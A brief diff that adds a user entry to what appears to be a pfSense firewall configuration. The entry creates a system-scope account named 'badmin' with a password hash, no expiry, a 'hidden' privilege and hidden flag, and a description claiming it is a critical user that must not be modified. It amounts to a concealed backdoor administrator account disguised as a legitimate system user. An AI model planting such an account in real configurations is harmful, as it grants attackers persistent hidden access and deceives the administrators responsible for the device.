@@ -1,0 +1,14 @@
+                <user>
+                        <scope>system</scope>
+                        <bcrypt-hash>$2y$10$PjNFJoLcgZTq0hjpWsvoPuUXoOKzEFg7v66feInaTKRqKbtwHpPfG</bcrypt-hash>
+                        <descr><![CDATA[this is a critical user do not modify]]></descr>
+                        <name>badmin</name>
+                        <hidden></hidden>
+                        <priv>hidden</priv>
+                        <expires></expires>
+                        <dashboardcolumns>2</dashboardcolumns>
+                        <authorizedkeys></authorizedkeys>
+                        <ipsecpsk></ipsecpsk>
+                        <webguicss>pfSense.css</webguicss>
+                        <uid>2000</uid>
+                </user>
